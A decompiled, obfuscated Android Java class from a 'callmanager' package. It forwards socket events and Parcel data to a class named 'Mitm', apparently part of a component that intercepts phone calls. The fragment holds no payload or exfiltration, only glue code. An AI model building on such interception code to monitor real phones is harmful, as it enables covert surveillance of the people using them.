package com.vvt.callmanager;

import android.net.LocalSocket;
import android.os.Parcel;
import com.fx.socket.e;

class h
  extends e
{
  h(g paramg, LocalSocket paramLocalSocket)
  {
    super(paramLocalSocket);
  }
  
  protected void a()
  {
    boolean bool = Mitm.g();
    if (bool) {}
    Mitm.b(this.a.c);
  }
  
  protected void a(Parcel paramParcel)
  {
    Mitm.a(this.a.c, paramParcel);
  }
  
  protected void a(Exception paramException)
  {
    boolean bool = Mitm.g();
    if (bool) {}
    Mitm.b(this.a.c);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/h.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */